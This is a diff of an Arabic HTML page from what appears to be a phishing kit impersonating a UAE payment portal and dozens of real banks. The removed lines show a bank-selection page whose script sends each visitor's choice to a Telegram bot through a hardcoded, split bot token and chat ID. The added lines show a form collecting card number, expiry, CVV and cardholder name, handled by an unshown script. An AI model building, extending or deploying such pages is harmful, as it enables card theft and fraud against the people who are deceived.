@@ -1,217 +1,22 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>اختيار البنك - بوابة سداد الإمارات</title>
-    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
-    <link rel="icon" href="logo.jpg" type="image/x-icon">
-    <style>
-        :root {
-            --primary-color: #008000;
-            --secondary-color: #FFD700;
-            --text-color: #333;
-            --light-gray: #f5f5f5;
-            --border-color: #ddd;
-        }
-
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-
-        body {
-            font-family: 'Tajawal', sans-serif;
-            background-color: #f9f9f9;
-            color: var(--text-color);
-            line-height: 1.6;
-        }
-
-        .container { max-width: 800px; margin: 0 auto; padding: 20px; min-height: 100vh; }
-
-        .header {
-            text-align: center; margin-bottom: 30px; padding: 20px;
-            background-color: white; border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        .header img { height: 80px; margin-bottom: 10px; }
-        .header h1 { color: var(--primary-color); font-size: 24px; margin-bottom: 10px; }
-
-        .form-container {
-            background-color: white; border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 30px; margin-bottom: 20px;
-        }
-
-        .bank-cards {
-            display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
-            gap: 15px; margin-top: 20px;
-        }
-
-        .bank-card {
-            background-color: white; border: 2px solid var(--border-color);
-            border-radius: 10px; padding: 15px; text-align: center;
-            cursor: pointer; transition: all 0.3s;
-        }
-        .bank-card:hover { border-color: var(--primary-color); transform: translateY(-2px); }
-        .bank-card img { height: 50px; width: auto; max-width: 100%; object-fit: contain; margin-bottom: 10px; }
-        .bank-card p { font-size: 14px; font-weight: 500; }
-    </style>
+    <title>الدفع بالبطاقة</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <img src="logo.jpg" alt="شعار سداد الإمارات">
-            <h1>اختر البنك الخاص بك للدفع</h1>
-        </div>
-        
-        <div class="form-container">
-            <p>يرجى اختيار البنك الذي ترغب في استخدامه لإتمام عملية الدفع:</p>
-            
-            <div class="bank-cards">
-                <div class="bank-card" data-name="بنك الإمارات دبي الوطني">
-                    <img src="https://i.ibb.co/dwhqmDsF/Emirates-NBD.jpg" alt="بنك الإمارات دبي الوطني">
-                    <p>بنك الإمارات دبي الوطني</p>
-                </div>
-                <div class="bank-card" data-name="بنك أبو ظبي الأول">
-                    <img src="https://i.ibb.co/gnNdPDJ/First-Abu-Dhabi-Bank-Logo-svg.png" alt="بنك أبو ظبي الأول">
-                    <p>بنك أبو ظبي الأول</p>
-                </div>
-                <div class="bank-card" data-name="بنك أبو ظبي التجاري">
-                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSjH4Qs3CGxyTwB8k3DPHpsD8fyKOZ8qhCt_b1Nx_4IVg&s=10" alt="بنك أبو ظبي التجاري">
-                    <p>بنك أبو ظبي التجاري</p>
-                </div>
-                <div class="bank-card" data-name="بنك دبي الإسلامي">
-                    <img src="https://i.ibb.co/8DbXSsw0/dib-logo-personal-business-og.jpg" alt="بنك دبي الإسلامي">
-                    <p>بنك دبي الإسلامي</p>
-                </div>
-                <div class="bank-card" data-name="بنك المشرق">
-                    <img src="https://i.ibb.co/21YLkTtB/MASQ-AE-BIG-e09012bc.png" alt="بنك المشرق">
-                    <p>بنك المشرق</p>
-                </div>
-                <div class="bank-card" data-name="بنك أبو ظبي الإسلامي">
-                    <img src="https://i.ibb.co/ynB1yRtg/images.jpg" alt="بنك أبو ظبي الإسلامي">
-                    <p>بنك أبو ظبي الإسلامي</p>
-                </div>
-                <!-- بنوك إضافية -->
-                <div class="bank-card" data-name="مصرف الشارقة الإسلامي">
-                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0N-X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1" alt="مصرف الشارقة الإسلامي">
-                    <p>مصرف الشارقة الإسلامي</p>
-                </div>
-                <div class="bank-card" data-name="بنك رأس الخيمة الوطني">
-                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0N-X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1" alt="بنك رأس الخيمة الوطني">
-                    <p>بنك رأس الخيمة الوطني</p>
-                </div>
-                <div class="bank-card" data-name="مصرف عجمان">
-                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0N-X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1" alt="مصرف عجمان">
-                    <p>مصرف عجمان</p>
-                </div>
-                <div class="bank-card" data-name="بنك دبي التجاري">
-                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0N-X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1" alt="بنك دبي التجاري">
-                    <p>بنك دبي التجاري</p>
-                </div>
-                <div class="bank-card" data-name="بنك الفجيرة الوطني">
-                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0N-X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1" alt="بنك الفجيرة الوطني">
-                    <p>بنك الفجيرة الوطني</p>
-                </div>
-                <div class="bank-card" data-name="بنك أم القيوين الوطني">
-                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0N-X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1" alt="بنك أم القيوين الوطني">
-                    <p>بنك أم القيوين الوطني</p>
-                </div>
-                <div class="bank-card" data-name="بنك الإمارات الإسلامي">
-                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0N-X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1" alt="بنك الإمارات الإسلامي">
-                    <p>بنك الإمارات الإسلامي</p>
-                </div>
-                <div class="bank-card" data-name="البنك العربي المتحد">
-                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0N-X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1" alt="البنك العربي المتحد">
-                    <p>البنك العربي المتحد</p>
-                </div>
-                <div class="bank-card" data-name="ويو بنك">
-                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0N-X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1" alt="ويو بنك">
-                    <p>ويو بنك</p>
-                </div>
-                <div class="bank-card" data-name="بنك المارية المحلي">
-                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0N-X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1" alt="بنك المارية المحلي">
-                    <p>بنك المارية المحلي</p>
-                </div>
-                <div class="bank-card" data-name="بنك الاستثمار">
-                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0N-X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1" alt="بنك الاستثمار">
-                    <p>بنك الاستثمار</p>
-                </div>
-                <div class="bank-card" data-name="المصرف العربي للاستثمار والتجارة الخارجية">
-                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0N-X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1" alt="المصرف العربي للاستثمار والتجارة الخارجية">
-                    <p>المصرف العربي للاستثمار والتجارة الخارجية</p>
-                </div>
-                <div class="bank-card" data-name="بنك الشارقة">
-                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0N-X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1" alt="بنك الشارقة">
-                    <p>بنك الشارقة</p>
-                </div>
-                <div class="bank-card" data-name="البنك التجاري الدولي">
-                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0N-X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1" alt="البنك التجاري الدولي">
-                    <p>البنك التجاري الدولي</p>
-                </div>
-                <!-- بنوك أجنبية رئيسية -->
-                <div class="bank-card" data-name="إتش إس بي سي (HSBC)">
-                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0N-X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1" alt="إتش إس بي سي">
-                    <p>إتش إس بي سي (HSBC)</p>
-                </div>
-                <div class="bank-card" data-name="ستاندرد تشارترد">
-                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0N-X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1" alt="ستاندرد تشارترد">
-                    <p>ستاندرد تشارترد</p>
-                </div>
-                <div class="bank-card" data-name="سيتي بنك">
-                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0N-X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1" alt="سيتي بنك">
-                    <p>سيتي بنك</p>
-                </div>
-                <div class="bank-card" data-name="البنك العربي">
-                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0N-X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1" alt="البنك العربي">
-                    <p>البنك العربي</p>
-                </div>
-                <div class="bank-card" data-name="بنك مصر">
-                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0N-X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1" alt="بنك مصر">
-                    <p>بنك مصر</p>
-                </div>
-                <div class="bank-card" data-name="البنك الأهلي الكويتي">
-                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0N-X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1" alt="البنك الأهلي الكويتي">
-                    <p>البنك الأهلي الكويتي</p>
-                </div>
-                <div class="bank-card" data-name="بنك الكويت الوطني">
-                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0N-X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1_X-K0X1n1" alt="بنك الكويت الوطني">
-                    <p>بنك الكويت الوطني</p>
-                </div>
-            </div>
-        </div>
+        <h2>معلومات البطاقة</h2>
+        <form id="paymentForm">
+            <input type="text" id="cardNumber" placeholder="رقم البطاقة (16 رقم)" pattern="\d{16}" maxlength="16" required>
+            <input type="text" id="expiry" placeholder="شهر/سنة (MM/YY)" pattern="(0[1-9]|1[0-2])\/\d{2}" required>
+            <input type="text" id="cvv" placeholder="CVV (3 أرقام)" pattern="\d{3}" maxlength="3" required>
+            <input type="text" id="holderName" placeholder="اسم حامل البطاقة" pattern="[A-Za-z\s]+" required>
+            <button type="submit">تأكيد الدفع</button>
+        </form>
     </div>
-
-    <script>
-        // بيانات البوت الخاصة بك
-        const p1 = '8694373679';
-        const p2 = 'AAEPIxmUpeqtiB1WzGn79btA9FYnHo3educ';
-        const botToken = `${p1}:${p2}`;
-        const chatId = '8766280195';
-
-        async function sendBotMessage(message) {
-            try {
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-            } catch (e) { console.error(e); }
-        }
-
-        document.querySelectorAll('.bank-card').forEach(card => {
-            card.addEventListener('click', async function() {
-                const bankName = this.dataset.name;
-                const msg = `🏦 <b>اختيار البنك (صفحة 3)</b>\n\n📊 البنك المختار: ${bankName}`;
-                
-                // إرسال رسالة جديدة منفصلة
-                await sendBotMessage(msg);
-                
-                // الانتقال للصفحة الرابعة
-                window.location.href = 'page4.html';
-            });
-        });
-    </script>
+    <script src="script.js"></script>
 </body>
 </html>
